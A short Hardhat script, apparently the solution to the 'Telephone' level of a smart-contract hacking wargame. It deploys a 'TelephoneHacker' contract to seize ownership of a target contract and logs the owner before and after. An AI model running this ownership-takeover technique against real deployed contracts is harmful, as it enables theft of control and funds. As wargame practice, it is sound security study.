const {ethers} = require("hardhat");
require('dotenv').config()

async function main() {
  const Telephone = await ethers.getContractFactory("Telephone");
  const telephone = await Telephone.attach(process.env.TELEPHONE_ADDR);
  const owner = await telephone.owner();
  console.log("telephone owner:", owner);
  const [account] = await ethers.getSigners();
  console.log('accout:', account.address);
  if(owner === account.address) {
    console.log('owner is the same as account');
    return;
  }

  const TelephoneHacker = await ethers.getContractFactory("TelephoneHacker");
  const telephone_hacker = await TelephoneHacker.deploy();
  await telephone_hacker.deployed();

  const tx = await telephone_hacker.changeOwner(telephone.address);
  await tx.wait();
  const newOwner = await telephone.owner();
  console.log("telephone owner:", newOwner);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
